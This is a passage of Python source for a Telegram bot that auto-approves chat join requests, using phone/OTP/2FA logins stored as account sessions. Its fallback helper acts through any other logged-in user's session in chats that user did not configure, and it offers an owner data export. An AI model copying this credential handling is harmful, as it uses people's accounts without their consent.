            "📱 Please share your phone number to login:\n\n"
            "\"You can either:\"\n"
            "\"1. Click the '📱 Share Phone Number' button below\"\n"
            "\"2. Or type your phone number in international format (e.g., +1234567890)\"\n\n"
            "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
            reply_markup=phone_keyboard
        )
        
        await state.set_state(LoginStates.waiting_for_phone)
    
    elif data == 'approve_logout':
        await state.clear()
        if str(uid) in user_sessions:
            # Disconnect client
            client = await get_user_client(uid)
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            
            user_sessions[str(uid)]['is_active'] = False
            save_state()
            kb = await get_approve_kb(uid)
            await cb.message.edit_caption(
                caption=APPROVE_WELCOME_TEXT + "\n\n🔴 Status: Logged Out",
                reply_markup=kb,
                parse_mode=None
            )
            await cb.answer("✅ Logged out!")
        else:
            await cb.answer("ℹ️ You are not logged in.")
    
    elif data == 'approve_all_info':
        await cb.answer(
            "📝 Commands:\n\n"
            "/approve (chat_id) — Show approval UI\n"
            "/approve all (chat_id) — Approve all\n"
            "/approve count(10) (chat_id) — Approve 10", 
            show_alert=True
        )

@dp.message(Command('cmds'))
async def cmds(msg: types.Message):
    uid = msg.from_user.id
    if not await is_member_of_channel(uid):
        await msg.answer(
            "❌ You must join our channel to use this bot.\n"
            "Please join first and then try again.",
            parse_mode=None,
        )
        return
    
    help_text = (
    "✦ 🤖 <b>𝗔𝗞 𝗔𝗨𝗧𝗢 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 — 𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "\n"
    "👤 <b>𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀</b>\n"
    "├─ /start — Start bot & accept privacy terms\n"
    "├─ /cmds — Show help commands\n"
    "├─ /login — Connect your account\n"
    "├─ /logout — Disconnect account\n"
    "├─ /cancel — Cancel ongoing operation\n"
    "└─ /export — Export data (Owner only)\n"
    "\n"
    "⚡ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀</b>\n"
    "├─ <code>/approve all chat_id</code>\n"
    "│  Approve all pending requests\n"
    "└─ <code>/approve count(n) chat_id</code>\n"
    "   Approve a specified number of members\n"
    "\n"
    "👥 <b>𝗚𝗿𝗼𝘂𝗽 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 (𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗻𝗹𝘆)</b>\n"
    "├─ <code>/set_mode mode value</code> — Configure mode\n"
    "│  ├─ <code>limit n</code> — Approve up to N users\n"
    "│  ├─ <code>count n</code> — Process when queue reaches N\n"
    "│  ├─ <code>time HH:MM</code> — Approve at IST time\n"
    "│  └─ <code>immediate</code> — Instant approval\n"
    "├─ /reset — Reset modes & counters\n"
    "└─ /status — View group mode status\n"
    "\n"
    "💡 <b>𝗙𝗼𝗿𝗺𝗮𝘁 𝗘𝘅𝗮𝗺𝗽𝗹𝗲𝘀</b>\n"
    "├─ <code>CODE_12345</code> — OTP verification\n"
    "└─ <code>PASS_mypassword</code> — 2FA password\n"
    "\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "👑 <b><a href=\"https://t.me/anujedits76\">𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗱 𝗕𝘆 𝗔𝗻𝘂𝗷 𝗞𝘂𝗺𝗮𝗿</a></b>\n"
    "💎 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 • 𝗦𝗽𝗲𝗲𝗱 • 𝗣𝗲𝗿𝗳𝗼𝗿𝗺𝗮𝗻𝗰𝗲\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await msg.answer(help_text, parse_mode=ParseMode.HTML)

def escape_md(text: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + c if c in escape_chars else c for c in text)

async def safe_approve_user(chat_id: int, user_id: int) -> bool:
    try:
        await bot.approve_chat_join_request(chat_id, user_id)
        return True
    except TelegramForbiddenError:
        return False
    except Exception as e:
        if hasattr(e, 'description') and 'USER_ALREADY_PARTICIPANT' in e.description:
            return False
        logging.warning(f"Approval error user {user_id} chat {chat_id}: {e}")
        return False

# ---------- Session (userbot) approval helpers ----------
# Telethon's importer response carries access hashes for the users; cache them
# so approve calls work even for users the fresh session has never seen.
_pending_input_users = {}

async def resolve_chat(client, chat_id: int):
    """Get the chat peer. A fresh StringSession has an empty entity cache,
    so load dialogs once if the chat is not known yet."""
    try:
        return await client.get_input_entity(chat_id)
    except ValueError:
        await client.get_dialogs(limit=None)
        return await client.get_input_entity(chat_id)

async def open_session_client(chat_id: int, preferred_uid=None):
    """Return (client, peer) for the first logged-in account that can see chat_id.
    The preferred admin (who set the mode) is tried first."""
    order = []
    if preferred_uid is not None and str(preferred_uid) in user_sessions:
        order.append(str(preferred_uid))
    order += [k for k, v in user_sessions.items() if v.get('is_active') and k not in order]
    for k in order:
        client = await get_user_client(int(k))
        if not client:
            continue
        try:
            peer = await resolve_chat(client, chat_id)
            return client, peer
        except Exception as e:
            logging.warning(f"Session {k} cannot access chat {chat_id}: {e}")
            await client.disconnect()
    return None, None

async def session_fetch_pending(client, peer, limit: int = 5000) -> list:
    """List every pending join request user id through the session."""
    from telethon.tl.functions.messages import GetChatInviteImportersRequest
    from telethon.tl.types import InputUserEmpty, InputUser

    ids, seen = [], set()
    offset_date, offset_user = 0, InputUserEmpty()
    while len(ids) < limit:
        res = await client(GetChatInviteImportersRequest(
            peer=peer,
            requested=True,
            offset_date=offset_date,
            offset_user=offset_user,
            limit=100
        ))
        if not res.importers:
            break
        users = {u.id: u for u in res.users}
        new_on_page = 0
        for imp in res.importers:
            u = users.get(imp.user_id)
            if u is not None and getattr(u, 'access_hash', None) is not None:
                _pending_input_users[imp.user_id] = InputUser(user_id=u.id, access_hash=u.access_hash)
            if imp.user_id not in seen:
                seen.add(imp.user_id)
                ids.append(imp.user_id)
                new_on_page += 1
        last = res.importers[-1]
        if len(res.importers) < 100 or new_on_page == 0:
            break
        offset_date = last.date
        offset_user = _pending_input_users.get(last.user_id, InputUserEmpty())
    return ids[:limit]

async def session_approve(client, peer, user_id: int) -> bool:
    from telethon.tl.functions.messages import HideChatJoinRequestRequest
    try:
        target = _pending_input_users.get(user_id) or await client.get_input_entity(user_id)
        await client(HideChatJoinRequestRequest(peer=peer, user_id=target, approved=True))
        return True
    except Exception as e:
        logging.warning(f"Session approve failed for user {user_id}: {e}")
        return False

async def fetch_pending_user_ids(chat_id: int, cfg: dict = None) -> list:
    """Pending requests can only be read through an admin's logged-in session."""
    owner = (cfg or {}).get('owner_id')
    client, peer = await open_session_client(chat_id, owner)
    if not client:
        logging.info(f"No logged-in admin session can read pending requests for chat {chat_id}")
        return []
    try:
        return await session_fetch_pending(client, peer)
    except Exception as e:
        logging.warning(f"Could not read pending requests for chat {chat_id}: {e}")
        return []
    finally:
        await client.disconnect()

async def approve_users(chat_id: int, user_ids, cfg: dict = None) -> list:
    """Approve through the bot first; if the bot cannot (not admin / no rights),
    fall back to the logged-in admin session. Returns the approved user ids."""
    owner = (cfg or {}).get('owner_id')
    approved = []
    session = None  # (client, peer) once opened, False if none available
    for uid in user_ids:
        if await safe_approve_user(chat_id, uid):
            approved.append(uid)
            continue
        if session is None:
            client, peer = await open_session_client(chat_id, owner)
            session = (client, peer) if client else False
        if session and await session_approve(session[0], session[1], uid):
            approved.append(uid)
        await asyncio.sleep(0.5)  # rate limit protection
    if session:
        await session[0].disconnect()
    return approved

async def notify_approved(chat_id: int, uid: int):
    try:
        chat_title = await get_chat_name(chat_id)
        try:
            name = (await bot.get_chat(uid)).full_name
        except Exception:
            name = "there"
        await bot.send_message(
            uid,
            f"Hey {name}!!\n"
            f"Your request to join {chat_title} has been approved.\n"
            "Join Request approval Services.\n"
            "Click /start for more info.",
            parse_mode=None
        )
    except TelegramForbiddenError:
        pass
    except Exception as e:
        logging.warning(f"Could not notify approved user {uid}: {e}")

async def process_pending_requests(chat_id: int, cfg: dict):
    pending_ids = await fetch_pending_user_ids(chat_id, cfg)
    if not pending_ids:
        return

    mode = cfg.get('mode')
    approved = []

    if mode == 'immediate':
        approved = await approve_users(chat_id, pending_ids, cfg)
        cfg['count'] = cfg.get('count', 0) + len(approved)

    elif mode == 'limit':
        room = max(0, cfg.get('limit', 0) - cfg.get('count', 0))
        approved = await approve_users(chat_id, pending_ids[:room], cfg)
        cfg['count'] = cfg.get('count', 0) + len(approved)

    elif mode == 'count':
        pend = cfg.setdefault('pending', [])
        for uid in pending_ids:
            if uid not in pend:
                pend.append(uid)
        if len(pend) >= cfg.get('limit', 0):
            approved = await approve_users(chat_id, list(pend), cfg)
            pend.clear()

    elif mode == 'time':
        pend = cfg.setdefault('pending', [])
        for uid in pending_ids:
            if uid not in pend:
                pend.append(uid)

    save_state()
    for uid in approved:
        await notify_approved(chat_id, uid)

async def send_approval_message(req: types.ChatJoinRequest):
    chat_title = await get_chat_name(req.chat.id)
    name = req.from_user.full_name
    text = (
        f"Hey {name}!!\n"
        f"Your request to join {chat_title} has been approved.\n"
        "Join Request approval Services.\n"
        "Click /start for more info."
    )
    
    try:
        await bot.send_message(req.from_user.id, text, parse_mode=None)
    except TelegramForbiddenError:
        pass

@dp.message(Command('set_mode'))
async def set_mode(msg: types.Message):
    parts = msg.text.strip().split()[1:]
    
    # Check if command is in group/channel
    if msg.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL):
        if not await is_chat_admin(msg.chat.id, msg.from_user.id):
            await msg.answer('❌ Only admins can configure modes.', parse_mode=None)
            return
        
        if len(parts) < 1:
            await msg.answer(
                '⚡ 𝗦𝗲𝘁 𝗠𝗼𝗱𝗲 - 𝗨𝘀𝗮𝗴𝗲\n\n'
                'Usage: /set_mode (mode) [value]\n\n'
                '📝 Available Modes:\n'
                '• limit (n) — Approve up to N users, then stop\n'
                '• count (n) — Queue requests; approve when reaching N\n'
                '• time (HH:MM) — Approve queued requests at IST time\n'
                '• immediate — Approve everyone instantly\n\n'
                '💡 Examples:\n'
                '• /set_mode limit 50\n'
                '• /set_mode count 10\n'
                '• /set_mode time 14:30\n'
                '• /set_mode immediate',
                parse_mode=None
            )
            return
        
        target_id_str = str(msg.chat.id)
        mode_arg = parts[0]
        args = parts[1:]
    
    # Command in private chat
    else:
        if len(parts) < 2:
            await msg.answer(
                '⚡ 𝗦𝗲𝘁 𝗠𝗼𝗱𝗲 - 𝗨𝘀𝗮𝗴𝗲\n\n'
                'Usage: /set_mode (chat_id) (mode) [value]\n\n'
                '📝 Available Modes:\n'
                '• limit (n) — Approve up to N users, then stop\n'
                '• count (n) — Queue requests; approve when reaching N\n'
                '• time (HH:MM) — Approve queued requests at IST time\n'
                '• immediate — Approve everyone instantly\n\n'
                '💡 Examples:\n'
                '• /set_mode -1001234567890 limit 50\n'
                '• /set_mode -1001234567890 count 10\n'
                '• /set_mode -1001234567890 time 14:30\n'
                '• /set_mode -1001234567890 immediate',
                parse_mode=None
            )
            return
        
        target_id_str, mode_arg = parts[0], parts[1]
        args = parts[2:]
        
        try:
            target_id = int(target_id_str)
        except ValueError:
            await msg.answer('❌ Invalid chat_id. Must be an integer.', parse_mode=None)
            return
        
        if not await is_chat_admin(target_id, msg.from_user.id):
            await msg.answer("❌ You must be admin in the target chat to set mode.", parse_mode=None)
            return
        
        target_id_str = str(target_id)
    
    cfg = None
    
    if mode_arg == 'limit':
        if not args or not args[0].isdigit():
            await msg.answer('❌ Usage: /set_mode limit (number)', parse_mode=None)
            return
        cfg = {'mode': 'limit', 'limit': int(args[0]), 'count': 0}
    
    elif mode_arg == 'count':
        if not args or not args[0].isdigit():
            await msg.answer('❌ Usage: /set_mode count (number)', parse_mode=None)
            return
        cfg = {'mode': 'count', 'limit': int(args[0]), 'pending': []}
    
    elif mode_arg == 'time':
        if not args or not re.match(r'^\d{1,2}:\d{2}$', args[0]):
            await msg.answer('❌ Usage: /set_mode time (HH:MM) IST', parse_mode=None)
            return
        cfg = {'mode': 'time', 'end_time': args[0], 'pending': [], 'last_approved_time': None}
    
    elif mode_arg == 'immediate':
        cfg = {'mode': 'immediate', 'count': 0}
    
    else:
        await msg.answer('❌ Invalid mode. Available: limit, count, time, immediate.', parse_mode=None)
        return
    
    cfg['owner_id'] = msg.from_user.id
    limits[target_id_str] = cfg
    save_state()
    
    if cfg['mode'] != 'time':
        await process_pending_requests(int(target_id_str), cfg)
    
    chat_name = await get_chat_name(int(target_id_str))
    resp = f"✅ Mode set to {mode_arg} for \"{chat_name}\""
    if 'limit' in cfg:
        resp += f": {cfg['limit']}"
    if 'end_time' in cfg:
        resp += f" until {cfg['end_time']} IST"
    
    await msg.answer(resp, parse_mode=None)

@dp.message(Command('reset'))
async def reset_command(msg: types.Message):
    parts = msg.text.strip().split()
    
    # Check if command is in group/channel
    if msg.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL):
        if not await is_chat_admin(msg.chat.id, msg.from_user.id):
            await msg.answer("❌ Only admins can reset modes.", parse_mode=None)
            return
        
        chat_id_str = str(msg.chat.id)
    
    # Command in private chat
    else:
        if len(parts) < 2:
            await msg.answer(
                "⚡ 𝗥𝗲𝘀𝗲𝘁 𝗠𝗼𝗱𝗲 - 𝗨𝘀𝗮𝗴𝗲\n\n"
                "Usage: /reset (chat_id)\n\n"
                "💡 Example:\n"
                "• /reset -1001234567890",
                parse_mode=None
            )
            return
        
        try:
            chat_id_int = int(parts[1])
            chat_id_str = str(chat_id_int)
        except ValueError:
            await msg.answer("❌ Invalid chat ID.", parse_mode=None)
            return
        
        try:
            if not await is_chat_admin(chat_id_int, msg.from_user.id):
                await msg.answer("❌ You must be admin in the target chat to reset modes.", parse_mode=None)
                return
        except Exception:
            await msg.answer("❌ Could not verify admin status. Are you admin in that chat?", parse_mode=None)
            return
    
    if chat_id_str in limits:
        limits.pop(chat_id_str)
        save_state()
        
        chat_name = await get_chat_name(int(chat_id_str))
        await msg.answer(f"🔄 Mode reset for chat \"{chat_name}\"", parse_mode=None)
    else:
        await msg.answer("ℹ️ No mode set for this chat.", parse_mode=None)
    
    dummy_cfg = {'mode': 'immediate'}
    await process_pending_requests(int(chat_id_str), dummy_cfg)

@dp.message(Command('status'))
async def status_command(msg: types.Message):
    parts = msg.text.strip().split()
    
    # Check if command is in group/channel
    if msg.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL):
        if not await is_chat_admin(msg.chat.id, msg.from_user.id):
            await msg.answer("❌ Only admins can check status.", parse_mode=None)
            return
        
        cid = str(msg.chat.id)
    
    # Command in private chat
    else:
        if len(parts) < 2:
            await msg.answer(
                "⚡ 𝗦𝘁𝗮𝘁𝘂𝘀 - 𝗨𝘀𝗮𝗴𝗲\n\n"
                "Usage: /status (chat_id)\n\n"
                "💡 Example:\n"
                "• /status -1001234567890",
                parse_mode=None
            )
            return
        
        cid = parts[1]
        try:
            int(cid)
        except ValueError:
            await msg.answer("❌ Invalid chat ID.", parse_mode=None)
            return
        
        try:
            if not await is_chat_admin(int(cid), msg.from_user.id):
                await msg.answer("❌ You must be admin in the target chat to check status.", parse_mode=None)
                return
        except Exception:
            await msg.answer("❌ Could not verify admin status. Are you admin in that chat?", parse_mode=None)
            return
    
    cfg = limits.get(cid)
    if not cfg:
        await msg.answer('ℹ️ No mode set for this chat.', parse_mode=None)
        return
    
    chat_name = await get_chat_name(int(cid))
    text = f"📊 𝗠𝗼𝗱𝗲 𝗦𝘁𝗮𝘁𝘂𝘀\n\nChat: \"{chat_name}\"\nMode: {cfg['mode']}"
    
    if cfg['mode'] == 'limit':
        text += f"\nProgress: {cfg.get('count',0)}/{cfg['limit']}"
    elif cfg['mode'] == 'count':
        text += f"\nPending: {len(cfg.get('pending',[]))}/{cfg['limit']}"
    elif cfg['mode'] == 'time':
        text += f"\nEnd Time: {cfg['end_time']} IST"
    
    await msg.answer(text, parse_mode=None)

@dp.chat_join_request()
async def handle_join_request(req: types.ChatJoinRequest):
    uid = req.from_user.id
    cid = str(req.chat.id)
    cfg = limits.get(cid, {})
    mode = cfg.get('mode')

    approved_now = []

    if mode == 'immediate':
        approved_now = await approve_users(req.chat.id, [uid], cfg)
        cfg['count'] = cfg.get('count', 0) + len(approved_now)

    elif mode == 'limit' and cfg.get('count', 0) < cfg.get('limit', 0):
        approved_now = await approve_users(req.chat.id, [uid], cfg)
        cfg['count'] = cfg.get('count', 0) + len(approved_now)

    elif mode == 'count':
        pend = cfg.setdefault('pending', [])
        pend.append(uid)
        if len(pend) >= cfg.get('limit', 0):
            approved_now = await approve_users(req.chat.id, list(pend), cfg)
            pend.clear()

    elif mode == 'time':
        pend = cfg.setdefault('pending', [])
        pend.append(uid)

    save_state()

    for approved_uid in approved_now:
        await notify_approved(req.chat.id, approved_uid)

async def time_mode_loop():
    while True:
        try:
            now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            current_hm = now.strftime("%H:%M")

            for chat_id_str, cfg in list(limits.items()):
                if cfg.get('mode') == 'time':
                    last_approved = cfg.get('last_approved_time')
                    if current_hm >= cfg['end_time'] and last_approved != current_hm:
                        chat_id = int(chat_id_str)
                        # Everything queued in the bot plus whatever the session can see
                        pend = list(cfg.get('pending', []))
                        for uid in await fetch_pending_user_ids(chat_id, cfg):
                            if uid not in pend:
                                pend.append(uid)

                        approved = await approve_users(chat_id, pend, cfg)
                        for uid in approved:
                            await notify_approved(chat_id, uid)

                        cfg['pending'] = []
                        cfg['last_approved_time'] = current_hm
                        save_state()

        except Exception as e:
            logging.warning(f"Error in time_mode_loop: {e}")

        await asyncio.sleep(60)


async def main():
    print('🤖 MD AUTO REQUEST BOT is started!')
    print('👨🏻‍💻 Dev : Anuj Kumar')
    
    await get_bot_username()
    
    for chat_id_str, cfg in limits.items():
        try:
            if cfg.get('mode') != 'time':
                await process_pending_requests(int(chat_id_str), cfg)
        except Exception as e:
            logging.warning(f"Error processing pending requests for chat {chat_id_str}: {e}")
    
    asyncio.create_task(time_mode_loop())
    
    # Register command menu
    from aiogram.types import BotCommand
    commands = [
        BotCommand(command="start", description="🏠 Start the bot"),
        BotCommand(command="cmds", description="📋 All commands"),
        BotCommand(command="login", description="🔑 Login account"),
        BotCommand(command="logout", description="🚪 Logout account"),
        BotCommand(command="approve", description="✅ Approve join requests"),
        BotCommand(command="limits", description="⚙️ View/set limits"),
        BotCommand(command="cancel", description="❌ Cancel operation"),
    ]
    await bot.set_my_commands(commands)
    print("✅ Bot commands menu registered!")
    
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
